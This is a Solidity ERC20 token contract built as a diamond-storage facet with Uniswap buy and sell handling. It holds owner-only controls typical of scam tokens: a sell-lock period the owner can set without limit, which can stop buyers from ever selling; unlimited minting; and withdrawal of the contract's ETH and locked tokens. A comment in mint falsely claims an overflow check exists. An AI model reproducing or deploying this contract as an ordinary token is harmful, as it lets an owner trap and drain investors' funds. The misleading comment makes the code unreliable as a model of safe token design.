// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
import "./TestLib.sol";
contract totalSupplyFacet is IERC20, Context, Ownable {
    using SafeMath for uint256;

    function totalSupply() public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._balances[account];
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            ds._allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function enableTrading(address router, address pair) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.uniswapRouter = IUniswapV2Router02(router);
        ds.uniswapV2Pair = pair;
    }
    function includeOrExcludeFromLock(
        address _addr,
        bool _state
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._isExcludedFromLock[_addr] = _state;
    }
    function enableOrDisableLock(bool _state) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.lockEnabled = _state;
    }
    function setSellLockPeriod(uint256 _time) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.sellLockedTime = _time;
    }
    function withDrawETH() external onlyOwner {
        require(address(this).balance > 0, "Not enough eth");
        payable(owner()).transfer(address(this).balance);
    }
    function withdrawLockedTokens() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 balance = ds.lockedSupply;
        require(balance > 0, "No balance to withdraw");
        ds.lockedSupply = 0;
        _transfer(address(this), owner(), balance);
    }
    function burn(uint256 amount) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = ds._balances[msg.sender];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            ds._balances[msg.sender] = accountBalance - amount;
            ds._tTotal -= amount;
        }
        emit Transfer(msg.sender, address(0), amount);
    }
    function mint(address account, uint256 amount) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(account != address(0), "ERC20: mint to the zero address");
        ds._tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            ds._balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            //buying handler
            if (from == ds.uniswapV2Pair && to != address(ds.uniswapRouter)) {
                if (ds.lockEnabled && !ds._isExcludedFromLock[to]) {
                    ds.lastBuyTimestamp[to] = block.timestamp;
                }
                ds._buyCount++;
            }
            //selling handler
            else if (to == ds.uniswapV2Pair) {
                if (ds.lockEnabled && !ds._isExcludedFromLock[tx.origin]) {
                    uint256 unlockedTime = ds.lastBuyTimestamp[tx.origin] +
                        ds.sellLockedTime;
                    require(
                        unlockedTime <= block.timestamp,
                        "Tokens are still locked!"
                    );
                }
            }
        }
        ds._balances[from] = ds._balances[from].sub(amount);
        ds._balances[to] = ds._balances[to].add(amount);
        emit Transfer(from, to, amount);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        ds._allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}
